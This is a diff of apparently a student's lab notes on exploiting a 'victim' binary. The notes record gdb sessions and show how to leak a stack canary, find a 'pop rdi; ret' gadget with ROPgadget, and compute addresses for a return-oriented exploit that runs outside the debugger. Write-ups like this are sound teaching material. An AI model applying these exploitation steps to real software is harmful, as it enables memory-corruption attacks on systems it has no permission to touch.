@@ -34,7 +34,6 @@ Task 1:
 - Find Base Address
 
 	-- Use stack start address from mappings
-
 	(gdb) info proc mappings
 	process 3668
 	Mapped address spaces:
@@ -72,12 +71,10 @@ Task 1:
 - Find Binary Address
 
 	-- Tried to find binary base address (starting point) with 'readelf'
-
 		$ readelf -a victim | grep -i "entry"
 		Entry point address:               0x9e0
 
 	-- Later changed it to the starting address (first line) displayed by 'info proc map'
-
 		(gdb) info proc mappings
 		process 3668
 		Mapped address spaces:
@@ -115,7 +112,6 @@ went ahead without SEH exploit by leaking canary and writing it back on the stac
 - Regular version:
 
 	-- Get address of exit() and die()
-
 		-- (gdb) p exit
 		$2 = {<text variable, no debug info>} 0x7ffff7a47040 <__GI_exit>
 	
@@ -128,8 +124,7 @@ went ahead without SEH exploit by leaking canary and writing it back on the stac
 		0x0000555555554cd4  do_client
 		0x0000555555554db5  main
 
-	-- Get pop rdi; ret gadget
-	
+	-- Get pop rdi; ret gadget	
 		-- $ python ROPgadget.py --binary victim
 		0x0000000000000f33 : pop rdi ; ret
 
@@ -142,8 +137,12 @@ went ahead without SEH exploit by leaking canary and writing it back on the stac
 	0x7fffffffe4d8: 0x00    0xea    0x2a    0x6c    0x37    0x46    0x25    0x08
 	0x7fffffffe540: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
 
-	-- Run exploit
+	-- Calculate offset to run exploit outside GDB
+		-- offset for die() = 0x555555554aea (die) - 0x555555554000 (binary base) = 0xaea
+		-- offset for pop rdi; ret = 0x555555554000 + 0xf33 = 0x555555554f33
+		-- offset for string = 0x7fffffffe8e0 (stack base) - 0x7fffffffe540 (buffer) = 0x3a0
 
+	-- Run exploit
 		-- (gdb) c
 		Continuing.
 		pawned!: Success
@@ -152,7 +151,6 @@ went ahead without SEH exploit by leaking canary and writing it back on the stac
 - Bonus version:
 
 	-- Search for string 'HOME' in entire stack range
-
 		-- (gdb) find 0x7ffff7a0d000,0x7ffff7dd7000,"HOME"
 		0x7ffff7b9b4ca
 		warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd5e4f, halting search.
@@ -162,7 +160,6 @@ went ahead without SEH exploit by leaking canary and writing it back on the stac
 		0x7ffff7b9b4ca: "HOME"
 
 	-- Run exploit
-
 		-- (gdb) c
 		Continuing.
 		HOME: Success
